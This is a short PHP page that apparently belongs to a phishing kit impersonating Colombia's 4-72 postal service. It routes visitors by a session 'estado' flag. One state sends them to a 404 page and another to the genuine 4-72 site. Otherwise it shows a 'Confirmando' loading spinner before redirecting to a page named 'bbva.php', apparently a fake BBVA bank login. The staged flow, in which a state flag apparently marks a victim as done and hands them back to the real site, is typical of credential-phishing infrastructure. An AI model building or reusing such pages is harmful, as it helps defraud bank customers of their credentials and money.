<?php
session_start();


if(isset($_SESSION['estado']) && $_SESSION['estado'] == 1){


}else if(isset($_SESSION['estado']) && $_SESSION['estado'] == 2){

    header('location:/404.php');

}else if(isset($_SESSION['estado']) && $_SESSION['estado'] == 3){

    header('location:https://www.4-72.com.co/publicaciones/236/personas/');
}

?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Confirmando</title>
    
  <style>

*{
  margin: 0;
  padding: 0;
  font-family: Arial, Helvetica, sans-serif;
}
</style>


</head>
<body style="background-color:#dcdcdc2d;">
<br><br><br><br><br><br><br>
    <center><img src="/assets/plane-loader.gif" alt="" srcset=""></center>

<script>
    // Redirigir a otra página después de 5 segundos
setTimeout(function() {
  window.location.href = "bbva.php";
}, 15000);

</script>

</body>
</html>